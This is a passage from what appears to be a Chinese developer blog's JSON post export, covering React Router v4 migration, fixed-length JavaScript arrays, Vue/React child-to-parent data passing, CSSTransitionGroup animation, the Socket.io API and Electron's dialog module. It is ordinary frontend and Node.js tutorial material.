匹配不到，会重定向到 /welcome */&#125; ＜IndexRedirect to=\"/404\" /&gt; &lt;Route path=\"welcome\" component=&#123;Welcome&#125; /&gt; &lt;Route path=\"about\" component=&#123;About&#125; /&gt;&lt;/Route&gt; v4 的 404 1234567&lt;Switch&gt; &lt;Route path=\"/\" exact component=&#123;Home&#125; /&gt; &lt;Redirect from=\"/old-match\" to=\"/will-match\" /&gt; &lt;Route path=\"/will-match\" component=&#123;WillMatch&#125; /&gt; &#123;/* 上面都没有匹配到 */&#125; &lt;Route component=&#123;NoMatch&#125; /&gt;&lt;/Switch&gt; 主要的变化： v3 里使用&lt;IndexRedirect&gt;来指定默认重定向解决未匹配 404 的问题，而在 v4 里这个 API 被废除了，而是使用&lt;Switch&gt;的机制， &lt;Switch&gt;会渲染它里面的第一个可以匹配的&lt;Route&gt;，而且一个没有path的&lt;Route&gt;会满足任何匹配。一般来说在末尾放置一个没有path的&lt;Route&gt;来处理 404 多视图路由在 v3 很难实现这个路由，就不写了。 v4 多视图路由 1234567891011121314151617181920212223242526272829import './style.css';import React from 'react'import &#123; BrowserRouter as Router, Route, Link&#125; from 'react-router-dom'// 每一个逻辑路由都包含两个组件，一个负责显示 sidebar 另一个则是显示主区域// 只要当前的 URL 匹配，我们希望这两个部分都能被渲染出来。const routes = [ &#123; path: '/', exact: true, sidebar: () =&gt; &lt;div&gt;主页!&lt;/div&gt;, main: () =&gt; &lt;h2&gt;主页&lt;/h2&gt; &#125;, &#123; path: '/about', sidebar: () =&gt; &lt;div&gt;关于我们!&lt;/div&gt;, main: () =&gt; &lt;h2&gt;关于我们&lt;/h2&gt; &#125;, &#123; path: '/contact', sidebar: () =&gt; &lt;div&gt;联系我们!&lt;/div&gt;, main: () =&gt; &lt;h2&gt;联系我们&lt;/h2&gt; &#125;] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const SidebarExample = () =&gt; ( &lt;Router&gt; &lt;div style=&#123;&#123; display: 'flex' &#125;&#125;&gt; &lt;div style=&#123;&#123; padding: '10px', width: '40%', background: '#f0f0f0' &#125;&#125; &gt; &lt;ul style=&#123;&#123; listStyleType: 'none', padding: 0 &#125;&#125;&gt; &lt;li&gt;&lt;Link to=\"/\"&gt;主页&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;关于我们&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/contact\"&gt;联系我们&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;div&gt;&#123; routes.map((route, index) =&gt; ( // 这里渲染 sidebar // 在一个 app 里，你可以加入多个 &lt;Route&gt; ，这些 &lt;Route&gt; 都能正常渲染， // 只要你的 URL 是匹配的。也就是说在一个给定的 URL 下，渲染多个组件 // （例如 sidebar 或者是 breadcrumb），不管组件是什么，只要放入多个 // &lt;Route&gt; 组件，就可以被正常渲染出来。 &lt;Route key=&#123;index&#125; path=&#123;route.path&#125; exact=&#123;route.exact&#125; component=&#123;route.sidebar&#125; /&gt; )) &#125; &lt;/div&gt; &lt;/div&gt; &lt;div style=&#123;&#123; flex: 1, padding: '10px' &#125;&#125;&gt;&#123; routes.map((route, index) =&gt; ( // 这里渲染 main // 像上面这样在一个给定的路径下渲染多个 &lt;Route&gt; ，而且每个 // &lt;Route&gt; 的 component 属性都不相同。 &lt;Route key=&#123;index&#125; path=&#123;route.path&#125; exact=&#123;route.exact&#125; component=&#123;route.main&#125; /&gt; )) &#125;&lt;/div&gt; &lt;/div&gt; &lt;/Router&gt;)export default SidebarExample 过渡动画的不同主要的不同是指，v4 里不再使用{this.props.children}来指定子路由视图的位置。 v3 过渡动画 1234567891011&lt;ReactCSSTransitionGroup component=\"div\" transitionName=\"transitionWrapper\" className=&#123;style.transitionWrapper&#125; transitionEnterTimeout=&#123;300&#125; transitionLeaveTimeout=&#123;300&#125; &gt; &lt;div key=&#123;this.props.location.pathname&#125; style=&#123;&#123;position:\"absolute\", width: \"100%\"&#125;&#125;&gt; &#123;this.props.children&#125; &lt;/div&gt;&lt;/ReactCSSTransitionGroup&gt; v4 过渡动画 123456789101112131415161718&lt;ReactCSSTransitionGroup transitionName=\"fade\" transitionEnterTimeout=&#123;300&#125; transitionLeaveTimeout=&#123;300&#125; &gt; &#123;/* 这里和使用 ReactCSSTransitionGroup 没有区别， 唯一需要注意的是要把你的地址（location）传入 「Route」里使它可以在动画切换的时候匹配之前的 地址。 */&#125; &lt;Route location=&#123;location&#125; key=&#123;location.key&#125; path=\"/:h/:s/:l\" component=&#123;HSL&#125; /&gt;&lt;/ReactCSSTransitionGroup&gt; 唯一匹配主要是讲述，在 v4 里&lt;Switch&gt;的作用。在 v4 里默认是唯一匹配。 &lt;Switch&gt; 渲染匹配地址location的第一个&lt;Route&gt;或者&lt;Redirect&gt; 添加了&lt;Switch&gt; 里面的匹配就变成了唯一，匹配了/about就不会匹配/:user 12345&lt;Switch&gt; &lt;Route path=\"/about\" component=&#123;About&#125; /&gt; &lt;Route path=\"/company\" component=&#123;Company&#125; /&gt; &lt;Route path=\"/:user\" component=&#123;User&#125; /&gt;&lt;/Switch&gt; 假如，不添加&lt;Switch&gt;， 匹配/about时，同时又会匹配/:user，就会显示两个视图（多视图路由） 123&lt;Route path=\"/about\" component=&#123;About&#125; /&gt;&lt;Route path=\"/company\" component=&#123;Company&#125; /&gt;&lt;Route path=\"/:user\" component=&#123;User&#125; /&gt; 路由配置一些程序员喜欢把路由配置集中到一个地方，要知道路由的配置其实只是普通的数据。在把数据映射到组件上这方面，React 非常强大，并且，这里的 就是一个普通的组件。 补充：这个与 Vue-Router 的路由配置类似。 1234567891011121314151617181920const routes = [ &#123; path: '/redbull', component: Redbull &#125;, &#123; path: '/snacks', component: Snacks, routes: [ &#123; path: '/snacks/spicy', component: Spicy &#125;, &#123; path: '/snacks/chips', component: Chips &#125; ] &#125;] 通过 map 来遍历： 123456789101112&lt;Router&gt; &lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to=\"/snacks\"&gt;小吃&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/redbull\"&gt;红牛&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &#123;routes.map((route, i) =&gt; ( &lt;RouteWithSubRoutes key=&#123;i&#125; &#123;...route&#125; /&gt; ))&#125; &lt;/div&gt;&lt;/Router&gt; 路由切换事件在 v3 里有 onEnter 的事件来确定什么时候进入某个路径。而在 v4 里没有了这些事件，而是提供一个 history 对象。history 对象里有个 listen 方法，提供监听路由变化。 123this.props.history.listen(state =&gt; &#123; console.log(state);&#125;); 最后最后，请忘记 v3 拥抱 v4。 参考资料 https://reacttraining.com/react-router/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"React-Router","slug":"React-Router","permalink":"http://me.lizhooh.com/tags/React-Router/"}]},{"title":"创建固定长度的数组","slug":"Javascript/创建固定长度的数组","date":"2017-04-02T02:43:01.000Z","updated":"2021-06-15T06:10:52.824Z","comments":true,"path":"/stories/2017/04/Javascript/创建固定长度的数组/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/Javascript/创建固定长度的数组/","excerpt":"前言如果向创建固定长度的数组（内容无关紧要），可能你会想到，使用Array的构造函数。 1let list = new Array(5); 很抱歉的是Array构造函数返回的数组都是空位。 1new Array(5) // [, , , ,] 注意，空位不是undefined，一个位置的值等于undefined，依然是有值的。空位是没有任何值。 当然创建一个固定长度的数组，更多的是为了使用map/forEach来遍历。 但是：ES5对空位的处理，已经很不一致了，大多数情况下会忽略空位。 forEach(), filter(), every() 和 some() 都会跳过空位。 map() 会跳过空位，但会保留这个值 join() 和 toString() 会将空位视为 undefined，而 undefined 和 null 会被处理成空字符串。 12345const list = new Array(5).map((item = 0, index) =&gt; &#123; return index;&#125;);// [, , , ,]","text":"前言如果向创建固定长度的数组（内容无关紧要），可能你会想到，使用Array的构造函数。 1let list = new Array(5); 很抱歉的是Array构造函数返回的数组都是空位。 1new Array(5) // [, , , ,] 注意，空位不是undefined，一个位置的值等于undefined，依然是有值的。空位是没有任何值。 当然创建一个固定长度的数组，更多的是为了使用map/forEach来遍历。 但是：ES5对空位的处理，已经很不一致了，大多数情况下会忽略空位。 forEach(), filter(), every() 和 some() 都会跳过空位。 map() 会跳过空位，但会保留这个值 join() 和 toString() 会将空位视为 undefined，而 undefined 和 null 会被处理成空字符串。 12345const list = new Array(5).map((item = 0, index) =&gt; &#123; return index;&#125;);// [, , , ,] 使用 for1234567let list = [];for(let i = 0; i &lt; 5; i++) &#123; list[i] = i;&#125;// [0, 1, 2, 3, 4] 使用 for .. in/of1234567let list = new Array(5);for (let i in list) &#123; list[i] = i;&#125;// [0, 1, 2, 3, 4] 使用 Array.apply12345const list = Array.apply(null, &#123; length: 5 &#125;).map((item = 0, index) =&gt; &#123; return index;&#125;);// [0, 1, 2, 3, 4] 使用 Array.fill12345const list = new Array(5).fill(0).map((item = 0, index) =&gt; &#123; return index;&#125;);// [0, 1, 2, 3, 4] 使用 Array.from123456789101112131415const list = Array.from(&#123; length: 5 &#125;, (item = 0, index) =&gt; &#123; return index&#125;);// [0, 1, 2, 3, 4]const list2 = Array.from(&#123; length: 5 &#125;).map((item = 0, index) =&gt; &#123; return index;&#125;);// [0, 1, 2, 3, 4]const list3 = Array.from(new Array(5)).map((item = 0, index) =&gt; &#123; return index;&#125;);// [0, 1, 2, 3, 4] 使用扩展运算符 …12345const list = [...new Array(5)].map((item = 0, index) =&gt; &#123; return index;&#125;)// [0, 1, 2, 3, 4] 性能目前测试的情况是： 123456No.1 for..,in/of x 7,316,686 ops/sec ±1.03% (86 runs sampled)No.2 array fill x 3,000,709 ops/sec ±0.67% (89 runs sampled)No.3 array apply x 232,883 ops/sec ±0.63% (92 runs sampled)No.4 [...] x 163,630 ops/sec ±0.99% (90 runs sampled)No.5 array from x 83,867 ops/sec ±1.40% (89 runs sampled)No.6 array from new x 76,341 ops/sec ±0.70% (91 runs sampled) 最快 for…in/of，其次是 array.fill，因此建议使用 array.fill。 参考资料 http://es6.ruanyifeng.com/#docs/array","categories":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/categories/Javascript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"Vue 与 React 数据回传差异性","slug":"Vue/Vue 与 React 数据回传差异性","date":"2017-04-01T15:04:52.000Z","updated":"2021-06-15T06:10:52.899Z","comments":true,"path":"/stories/2017/04/Vue/Vue 与 React 数据回传差异性/","link":"","permalink":"http://me.lizhooh.com/stories/2017/04/Vue/Vue 与 React 数据回传差异性/","excerpt":"Vue 与 React 数据回传差异性我是比较喜欢使用 React 的编程思想的，主要JSX使用起来很灵活。 在 Vue 与 React 中要实现子组件传递数据给父组件是有一定的差异性，其实这都是一些套路。","text":"Vue 与 React 数据回传差异性我是比较喜欢使用 React 的编程思想的，主要JSX使用起来很灵活。 在 Vue 与 React 中要实现子组件传递数据给父组件是有一定的差异性，其实这都是一些套路。 React在 React 要实现子组件传递数据给父组件的代码是这样的： 在子组件里： 1234567891011121314export default Child () =&gt; &#123; const increment = (event) =&gt; &#123; // 对上提供接口 this.props.increment(event, 'hello'); &#125;; return ( &lt;div onClick=&#123;increment&#125; &gt; &lt;/div&gt; );&#125;; 在父组件里： 12345678910111213export default Parent () =&gt; &#123; const incrementTotal = (event, msg) =&gt; &#123; // 数据流上来了 console.log(msg); // hello &#125;; return ( &lt;div&gt; &lt;Child increment=&#123;incrementTotal&#125;/&gt; &lt;/div&gt; );&#125;; 触发的顺序： (Child) onClick =&gt; (Child props) increment =&gt; (Parent function) incrementTotal Vue在 Vue 当然不能使用JSX这种方法，官方说明是使用自定义事件的方式。 在子组件里： 123456789101112131415Vue.component('button-counter', &#123; template: '&lt;button v-on:click=\"increment\"&gt;&#123;&#123; counter &#125;&#125;&lt;/button&gt;', data: function () &#123; return &#123; counter: 0 &#125; &#125;, methods: &#123; increment: function (event) &#123; this.counter += 1 // 这句可以说是和上面的 this.props.increment(event, 'hello'); 等价 this.$emit('increment', event, 'hello') &#125; &#125;,&#125;) 在父组件里： 123456789101112131415161718192021&lt;div id=\"app\"&gt; &lt;div id=\"counter-event-example\"&gt; &lt;p&gt;&#123;&#123; total &#125;&#125;&lt;/p&gt; &lt;button-counter v-on:increment=\"incrementTotal\"&gt;&lt;/button-counter&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt;new Vue(&#123; el: '#counter-event-example', data: &#123; total: 0 &#125;, methods: &#123; incrementTotal: function (event, msg) &#123; // 数据流上来了 console.log(msg); // hello &#125; &#125;&#125;)&lt;/script&gt; 触发的顺序： (Child) onclick =&gt; (Child Function) increment =&gt; (Child props) increment =&gt; (Parent function) incrementTotal 总结从上面的函数触发顺利来看，它们基本都一样的。不过React还能更少，因为JSX允许在标签上写js语句，而在Vue里，只能通过绑定函数名称来使用函数。 12345// Vue 不能在标签上写 js 函数&lt;button v-on:click=\"increment\"&gt;&#123;&#123; counter &#125;&#125;&lt;/button&gt;// React 可以在标签上写 js 函数&lt;button onClick=&#123;event =&gt; &#123; /*... some think*/ &#125;&#125;&gt; &#123;this.state.counter&#125; &lt;/button&gt; 在Vue与React中要实现子组件传递数据给父组件是一定的差异性，但是无论怎样，都是百变不离其中。","categories":[{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/categories/Vue/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Vue","slug":"Vue","permalink":"http://me.lizhooh.com/tags/Vue/"}]},{"title":"React 动画 CSSTransitionGroup","slug":"React/React/React 动画 CSSTransitionGroup","date":"2017-03-30T09:01:47.000Z","updated":"2021-06-15T06:10:52.877Z","comments":true,"path":"/stories/2017/03/React/React/React 动画 CSSTransitionGroup/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React/React/React 动画 CSSTransitionGroup/","excerpt":"AnimatedReact 官方提供了两个插件用于处理动画效果：一个是偏底层的react-addons-transition-group，一个是在前者基础上进一步封装的react-addons-css-transition-group一个是在前者基础上进一步封装的。 简单的使用12345678910111213&lt;CSSTransitionGroup component=\"div\" className=\"color-set\" transitionName=\"todo\" transitionAppear=&#123;true&#125; transitionAppearTimeout=&#123;500&#125; transitionEnterTimeout=&#123;500&#125; transitionLeaveTimeout=&#123;300&#125; transitionEnter=&#123;true&#125; transitionLeave=&#123;false&#125; &gt; &lt;div&gt;&lt;/div&gt;&lt;/CSSTransitionGroup&gt;","text":"AnimatedReact 官方提供了两个插件用于处理动画效果：一个是偏底层的react-addons-transition-group，一个是在前者基础上进一步封装的react-addons-css-transition-group一个是在前者基础上进一步封装的。 简单的使用12345678910111213&lt;CSSTransitionGroup component=\"div\" className=\"color-set\" transitionName=\"todo\" transitionAppear=&#123;true&#125; transitionAppearTimeout=&#123;500&#125; transitionEnterTimeout=&#123;500&#125; transitionLeaveTimeout=&#123;300&#125; transitionEnter=&#123;true&#125; transitionLeave=&#123;false&#125; &gt; &lt;div&gt;&lt;/div&gt;&lt;/CSSTransitionGroup&gt; 在CSSTransitionGroup组件上，我们生命了一堆以transition开头的属性，这些属性被用来控制动画效果： transitionName 动画样式前缀，类似的 todo-enter、todo-leave 等 （类似 ng-animate） transitionAppear 布尔值，是否在所有组件挂载时触发动画 transitionEnterTimeout 控制入场动画的时长 transitionLeaveTimeout 控制退场动画的时长 transitionAppearTimeout 控制所有组件挂载的动画时长 transitionEnter 禁止使用入场动画 transitionLeave 禁止使用退场动画 默认情况下CSSTransitionGroup组件会被渲染为span标签，如果你想修改标签类型，可以使用component属性进行修改。其次是CSS部分的样式，CSS中类选择器遵循${transitionName}-appear之类的格式。 注意：css里的动画时间应该与transitionEnterTimeout等时间相等。 123456789101112131415161718192021222324252627.todo-appear &#123; opacity: 0.01; transform: translateY(-50px);&#125;.todo-appear.todo-appear-active &#123; opacity: 1; transform: translateY(0px); transition: all 500ms ease-in;&#125;.todo-enter &#123; opacity: 0.01; transform: translateY(-50px);&#125;.todo-enter.todo-enter-active &#123; opacity: 1; transform: translateY(0px); transition: all 500ms ease-in;&#125;.todo-leave &#123; opacity: 1; transform: translateY(0px);&#125;.todo-leave.todo-leave-active &#123; opacity: 0.01; transform: translateY(-50px); transition: all 300ms ease-in;&#125; 生命周期React 提供了 ReactTransitionGroup 组件供开发者在以下六个阶段向 DOM 节点注入数据： componentWillAppear(callback) 组件载入前触发 componentDidAppear() 组件载入后触发 componentWillEnter(callback) 组件入场前触发 componentDidEnter() 组件入场后触发 componentWillLeave(callback) 组件退场前触发 componentDidLeave() 组件退出后触发 实现动画结束后自动移除结点要点：CSSTransitionGroup的直接子组件必须有一个独一无二的 key 值。CSSTransitionGroup会根据key而影响到React的Diff算法。 比如说，下面代码： 123456789101112render = () =&gt; &#123; return ( &lt;ReactCSSTransitionGroup component=\"div\" transitionName=\"text\" transitionEnterTimeout=&#123;1000 * 10&#125; transitionLeave=&#123;false&#125; &gt; &lt;div key=&#123;id&#125;&gt;text&lt;/div&gt; &lt;/ReactCSSTransitionGroup&gt; )&#125; 第一次render的时候，会有一个&lt;div&gt;添加到DOM上。id = 1如果在 10s 内还进行render，那么此时DOM并不是只有一个&lt;div&gt;结点，而是两个。id = 2因为 10s 的时间还没到，ReactCSSTransitionGroup子组件的生命周期还没结束。等待第一个 10s 到达时，id = 1的结点会被自动的移除。 可以使用这个特性，制作一些瀑布的动画，或者一些弹幕效果，甚至是其他很炫酷的动画。 更新[更新： 2017-06-24] React 在 v15.5.4 里开始不维护react-addons-transition-group了，而是推荐使用另一个第三方组件react-transition-group，它们有着相同的 API。 安装： 1npm install --save react-transition-group 使用： 1234567891011import &#123; CSSTransitionGroup as Transition &#125; from 'react-transition-group';const test = () =&gt; ( &lt;Transition component=\"div\" transitionName=\"text\" // 动画名称 transitionEnterTimeout=&#123;1000 * 6&#125; transitionLeave=&#123;false&#125; &gt; &lt;/Transition&gt;);","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Nodejs for Socket.io","slug":"Nodejs/Nodejs for Socket.io","date":"2017-03-25T13:51:33.000Z","updated":"2021-06-15T06:10:52.837Z","comments":true,"path":"/stories/2017/03/Nodejs/Nodejs for Socket.io/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Nodejs/Nodejs for Socket.io/","excerpt":"Socket.ioSocket.io是一个非常出名的框架，可能有的人它先是知道了Socket.io才了解Nodejs。 Socket.Io 实现了实时双向的基于事件的通讯机制。旨在让各种浏览器与移动设备上实现实时 App 功能，模糊化各种传输机制。Socket.Io 是跨平台，多种连接方式自动切换，做即时通讯方面的开发很方便，而且能和 express 提供的传统请求方式很好的结合，即可以 在同一个域名，同一个端口提供两种连接方式：request/response, websocket(flashsocket,ajax…). 下面主要讲述Socket.io的使用，更多的还是去参考官方的文档吧，文档都写得很清楚的。注意：Socket.io的 API 是Client与Server对称性的，后面会讲到为什么是对称性的。","text":"Socket.ioSocket.io是一个非常出名的框架，可能有的人它先是知道了Socket.io才了解Nodejs。 Socket.Io 实现了实时双向的基于事件的通讯机制。旨在让各种浏览器与移动设备上实现实时 App 功能，模糊化各种传输机制。Socket.Io 是跨平台，多种连接方式自动切换，做即时通讯方面的开发很方便，而且能和 express 提供的传统请求方式很好的结合，即可以 在同一个域名，同一个端口提供两种连接方式：request/response, websocket(flashsocket,ajax…). 下面主要讲述Socket.io的使用，更多的还是去参考官方的文档吧，文档都写得很清楚的。注意：Socket.io的 API 是Client与Server对称性的，后面会讲到为什么是对称性的。 安装1npm install --save socket.io Client API客户端主要是指Web 前端前端引入： 1&lt;script src=\"//cdn.bootcss.com/socket.io/1.5.1/socket.io.min.js\"&gt;&lt;/script&gt; 连接 socket 服务器 let socket = io.connect(url, [options]); 例如： 1let socket = io.connect('http://127.0.0.1:3000'); 监听服务器的事件（接收服务器发来的数据） socket.on(type, callback); 例如： 123socket.on(\"login\", (data) =&gt; &#123; console.log(data); // &#123; user: xiao ming &#125;&#125;); 如果在 Nodejs 中使用了触发事件，上面就会收到： 123socket.emit(\"login\", &#123; user: 'xiao ming',&#125;); 对服务器触发事件（发送数据到服务器） socket.emit(type, data1, [data2, …]); 例如： 1234// 触发 Nodejs 中 socket 的 update 事件socket.emit(\"update\", &#123; title: 'Hello',&#125;); 此时 Nodejs 中应该有这样一个事件： 123socket.on(\"update\", (data) =&gt; &#123; console.log(data); // &#123; title: Hello &#125;&#125;); 断开服务器的连接1socket.disconnect(); Server API在 NodeJS 上创建 socket 需要依赖于 HTTP 服务器，所有首先就是要创建 HTTP 服务器。 创建 socket 实例不使用 Express： 12345let app = require('http').createServer(handler), io = require('socket.io')(app);// ... some thinkapp.listen(3000); 使用 Express： 12345678let express = require('express'), app = express(), server = require('http').createServer(app), io = require('socket.io')(server);// ... some thinkapp.listen(3000); 监听用户连接当前端使用 io.connect(url); 时就会触发服务器的 connection 事件 12345// 每一个新的用户连接时，都会向控制台输出 Welcomeio.on('connection', function (socket) &#123; // socket 是连接客户端的示例，后面所有对客户端的操作都通过 socket console.log(\"Welcome\");&#125;); 向客户端发送消息加入客户端，监控了一个 login 事件。那么，可以在服务端使用 emit 的触发事件，实际上客户端与服务端的 API 是对称的。 12345678io.on('connection', function (socket) &#123; console.log(\"Welcome\"); // 触发客户端的 login 事件 socket.emit(\"login\", &#123; title: 'Welcome' &#125;);&#125;); 此时客户端的代码应该是这样的： 123socket.on(\"login\", function(data) &#123; console.log(data); // &#123; title: 'Wecome' &#125;&#125;); 向所有连接的用户进行广播消息这个功能类似群发消息的功能。使用 io.sockets 对象， 对所有连接的用户进行广播。 1234// io = require('socket.io')(server);io.sockets.emit(\"login\", &#123; title: 'sockets'&#125;); 给除了自己以外的客户端广播消息1socket.broadcast.emit(\"msg\", &#123; data: \"hello,everyone\" &#125;); 分组 - 分房间1234567socket.on('group1', function (data) &#123; socket.join('group1');&#125;);socket.on('group2',function(data)&#123; socket.join('group2');&#125;); 监听客户端断开连接监听 disconnect 事件, 在 socket 对象里有一个 唯一的属性 socket.id ，这是每个客户端的唯一标识，可以使用它来判断是那个客户端端口连接。 1234io.sockets.on('disconnect', function(socket) &#123; // id 是唯一标识 console.log(socket.id);&#125;); 获取连接的客户端 socket123io.sockets.clients().forEach(function (socket) &#123; //.....&#125;) 关闭 socket.io 服务 io.close(); Server 中的 socket 对象socket 是与浏览器客户端进行交互的基础类。应该注意的 socket 不直接与实际的底层 TCP / IP 有关 socket，它只是该类的名称。 socket API socket.id (String) 会话的唯一标识符，来自底层 Client。 socket.rooms (Object) 一个字符串的哈希标识房间的客户端，房间名称索引。 socket.client (Client) 对基础客户端对象的引用。 socket.conn (engine.Socket) 参照客户端底层传输连接（engine.io Socket对象）。这允许访问 IO 传输层，它仍然（主要是）抽象实际的TCP/IP套接字。 socket.request (Request) socket.use(fn) (Function) 注册一个中间件，它是一个函数，为每个传入的数据包执行和接收作为参数的数据包。 12345678let io = require('socket.io')();io.on('connection', function(socket)&#123; socket.use(function(packet, next)&#123; if (packet.doge === true) return next(); next(new Error('Not a doge error')); &#125;);&#125;); socket.send([...args][, ack]) (Socket) 发送消息事件。 socket.emit(eventName[, ...args][, ack]) (Socket) 将事件发送到由字符串名称标识的套接字。可以包含任何其他参数。所有可序列化的数据结构的支持，包括缓冲区。 ack 是可选的，它用于将被调用与客户端的答应。 123456789101112socket.emit('hello', 'world');socket.emit('with-binary', 1, '2', &#123; 3: '4', 5: new Buffer(6) &#125;);client.emit('ferret', 'tobi', function (data) &#123; console.log(data); // data will be 'woot'&#125;);// the client code// client.on('ferret', function (name, fn) &#123;/ console.log(name); // name is tobi// fn('woot'); // woot 会被传到上面的 data 里// &#125;); socket.on(eventName, callback) (Socket) 为给定事件注册新的处理程序。 123socket.on('news', function (data) &#123; console.log(data);&#125;); socket.join(room[, callback]) (Socket) 与房间相关的，可以把客户端放置在某个房间里。 123456789io.on('connection', function(socket)&#123; socket.join('room 237', function()&#123; console.log(socket.rooms); // [ &lt;socket.id&gt;, 'room 237' ] io.to('room 237', 'a new user has joined the room'); // broadcast to everyone in the room &#125;);&#125;); socket.leave(room[, callback]) (Socket) 踢出分组。 socket.to(room) (Socket) 为随后的事件设置一个修饰符，该事件只会被广播到已加入给定房间的客户端。 1234567891011// 这种功能的实现，相当于你在多个 QQ 群里面发布消息let io = require('socket.io')();io.on('connection', function(client)&#123; // to one room 去到一个房间，然后触发一个事件 client.to('others').emit('an event', &#123; some: 'data' &#125;); // to multiple rooms 去到多个房间，然后触发一个事件 client.to('room1').to('room2').emit('hello');&#125;); socket.in(room) (Socket) 和 socket.to(room). 相同功能。 socket.compress(bool) (Socket) 数据是否压缩，如果值为真，事件数据会被压缩。当你不调用方法时，默认为 true。 socket.disconnect(close) (Socket) 断开该客户端。如果关闭值为 true，则关闭基础连接。否则，它只是退出命名空间。 相关一些操作12345678910111213141516171819202122232425262728293031323334353637io.on('connect', onConnect);function onConnect(socket) &#123; // sending to the client socket.emit('hello', 'can you hear me?', 1, 2, 'abc'); // sending to all clients except sender socket.broadcast.emit('broadcast', 'hello friends!'); // sending to all clients in 'game' room except sender socket.to('game').emit('nice game', \"let's play a game\"); // sending to all clients in 'game1' and/or in 'game2' room, except sender socket.to('game1').to('game2').emit('nice game', \"let's play a game (too)\"); // sending to all clients in 'game' room, including sender io.in('game').emit('big-announcement', 'the game will start soon'); // sending to all clients in namespace 'myNamespace', including sender io.of('myNamespace').emit('bigger-announcement', 'the tournament will start soon'); // sending to individual socketid (private message) socket.to(socketid).emit('hey', 'I just met you'); // sending with acknowledgement socket.emit('question', 'do you think so?', function (answer) &#123;&#125;); // sending without compression socket.compress(false).emit('uncompressed', \"that's rough\"); // sending a message that might be dropped if the client is not ready to receive messages socket.volatile.emit('maybe', 'do you really need it?'); // sending to all clients on this node (when using multiple nodes) io.local.emit('hi', 'my lovely babies');&#125; 参考资料 https://socket.io/docs/","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Electron dialog（对话框）的使用","slug":"Electron/Electron dialog（对话框）的使用","date":"2017-03-19T05:16:08.000Z","updated":"2021-06-15T06:10:52.813Z","comments":true,"path":"/stories/2017/03/Electron/Electron dialog（对话框）的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Electron/Electron dialog（对话框）的使用/","excerpt":"dialogdialog模块提供了 api 来展示原生的系统对话框，例如打开文件框，alert 框等。注意：dialog只能在主线程使用。 示例： 1234567891011dialog.showOpenDialog(mainWindow, &#123; properties: ['openFile'], filters: [ &#123; name: 'Images', extensions: ['jpg', 'png', 'gif'] &#125;, &#123; name: 'Movies', extensions: ['mkv', 'avi', 'mp4'] &#125;, &#123; name: 'Custom File Type', extensions: ['as'] &#125;, &#123; name: 'All Files', extensions: ['*'] &#125; ]&#125;, (filenames =&gt; &#123; // ...&#125;));","text":"dialogdialog模块提供了 api 来展示原生的系统对话框，例如打开文件框，alert 框等。注意：dialog只能在主线程使用。 示例： 1234567891011dialog.showOpenDialog(mainWindow, &#123; properties: ['openFile'], filters: [ &#123; name: 'Images', extensions: ['jpg', 'png', 'gif'] &#125;, &#123; name: 'Movies', extensions: ['mkv', 'avi', 'mp4'] &#125;, &#123; name: 'Custom File Type', extensions: ['as'] &#125;, &#123; name: 'All Files', extensions: ['*'] &#125; ]&#125;, (filenames =&gt; &#123; // ...&#125;)); 上面的代码打开了一个文件选择框，并指定了文件的类型。 APIdialog 模块有以下方法： dialog.showOpenDialog([browserWindow, ]options[, callback]) browserWindow BrowserWindow (可选) options Object (必须) title String defaultPath String filters Array properties Array - 包含了对话框的特性值, 可以包含 openFile, openDirectory, multiSelections and createDirectory callback Function (可选) 成功使用这个方法的话，就返回一个可供用户选择的文件路径数组，失败返回 undefined。filters 当需要限定用户的行为的时候，指定一个文件数组给用户展示或选择。 例如： 12345678&#123; filters: [ &#123; name: 'Images', extensions: ['jpg', 'png', 'gif'] &#125;, &#123; name: 'Movies', extensions: ['mkv', 'avi', 'mp4'] &#125;, &#123; name: 'Custom File Type', extensions: ['as'] &#125;, &#123; name: 'All Files', extensions: ['*'] &#125; ]&#125; extensions 数组应当只包含扩展名，不应该包含通配符或 ‘.’ 号 (例如 png 正确，但是 .png 和 *.png 不正确). 展示全部文件的话, 使用 ‘*’ 通配符 (不支持其他通配符)。 dialog.showSaveDialog([browserWindow, ]options[, callback]) browserWindow BrowserWindow (可选) options Object (必须) title String defaultPath String filters Array callback Function (可选) 成功使用这个方法的话，就返回一个可供用户选择的文件路径数组，失败返回 undefined。 filters 指定展示一个文件类型数组, 例子 dialog.showOpenDialog . 如果 callback 被调用, 